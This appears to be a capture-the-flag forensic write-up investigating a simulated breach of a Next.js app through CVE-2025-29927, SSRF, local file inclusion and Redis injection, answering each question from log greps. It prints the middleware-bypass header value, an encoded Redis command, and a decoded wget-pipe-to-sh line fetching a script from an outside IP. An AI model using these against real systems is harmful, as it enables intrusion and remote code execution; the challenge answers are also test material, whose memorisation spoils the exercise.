Scenario:

NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.

Artifacts:

        - access.log
        - bci-device.log
        - data-api.log
        - interface.log
        - redis.log

Q) What version of Next.js is the application using?

**cat interface.log | grep -i next**

<img width="1920" height="1080" alt="1" src="https://github.com/user-attachments/assets/c8a60c31-2559-4f8e-8386-660e5a5b2cf9" />


**Answer: 15.1.0**

Q) What local port is the Next.js-based application running on?

**cat interface.log**

<img width="1920" height="1080" alt="2" src="https://github.com/user-attachments/assets/ffc0088d-b2d6-42b0-aff3-2aaf45a852d1" />


**Answer: 3000**

Q) A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?

<img width="1920" height="1080" alt="3" src="https://github.com/user-attachments/assets/05de9ce9-ae09-438d-8b7b-08ec6efc9e5c" />


**Answer: CVE-2025-29927**

Q) The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?

**cat access.log | grep -i static | grep 200**

<img width="1920" height="1080" alt="4" src="https://github.com/user-attachments/assets/0cbffe37-ebdf-48c8-929d-260a6a36c03b" />


**Answer: main-app.js**

Q) Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?

**cat access.log | grep 10.129.231.211**

<img width="1920" height="1080" alt="5" src="https://github.com/user-attachments/assets/10b0f1c0-eb4d-4352-bb52-77fb38123a8d" />


**Answer: /api/bci/analytics**

Q) How many requests to this endpoint have resulted in an "Unauthorized" response?

**cat access.log | grep -i 401**

<img width="1920" height="1080" alt="6" src="https://github.com/user-attachments/assets/c02e55be-cd24-43fc-90ac-7c3a504fc523" />


**Answer: 5**

Q) When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?

**cat access.log | grep -i /api | grep 200**

<img width="1920" height="1080" alt="7" src="https://github.com/user-attachments/assets/ceec3def-dc93-4b0a-95ed-bc584f5dd7e7" />


**Answer: 2025-04-01 11:38:05**

Q) Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?

**cat interface.log | grep -i x-middleware**

<img width="1920" height="1080" alt="8" src="https://github.com/user-attachments/assets/90c740ea-704e-46e8-a41c-ff329618e74d" />


**Answer: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware**

Q) The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?

**cat data-api.log | grep 11:38:05**

<img width="1920" height="1080" alt="9" src="https://github.com/user-attachments/assets/d45ae1f0-a5c2-46c0-8832-8730f2dab980" />


**Answer: 4000**

Q) After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?

**cat data-api.log**

<img width="1920" height="1080" alt="10" src="https://github.com/user-attachments/assets/792d69d2-ced0-4bfb-b774-0f5aa2070e4e" />


**Answer: /logs**

Q) When the vulnerable endpoint found was used maliciously for the first time?

**cat data-api.log | grep -i logs**

<img width="1920" height="1080" alt="11" src="https://github.com/user-attachments/assets/9ae7aebc-4222-4f79-958c-9b84f275db4a" />


**Answer: 2025-04-01 11:39:01**

Q) What is the attack name the endpoint is vulnerable to?

<img width="1920" height="1080" alt="11" src="https://github.com/user-attachments/assets/ce4618c5-3b65-4f85-98d4-eeee97092cd4" />


**Answer: Local File Inclusion**

Q) What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?

**cat data-api.log | grep -i logs**

<img width="1920" height="1080" alt="11" src="https://github.com/user-attachments/assets/82c620f5-783a-4f8a-adec-9f89f626981f" />


**Answer: secret.key**

Q) Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?

**cat redis.log**

<img width="1920" height="1080" alt="12" src="https://github.com/user-attachments/assets/03f84b04-7cab-4f32-8144-680e2f9bd6c8" />


**Answer: OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb**

Q) Once decoded, what is the command?

**echo -n "d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo" | base64 -d**

<img width="1920" height="1080" alt="13" src="https://github.com/user-attachments/assets/1ab2ce86-16ea-44c0-ab32-204b7c7374af" />


**Answer: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh**
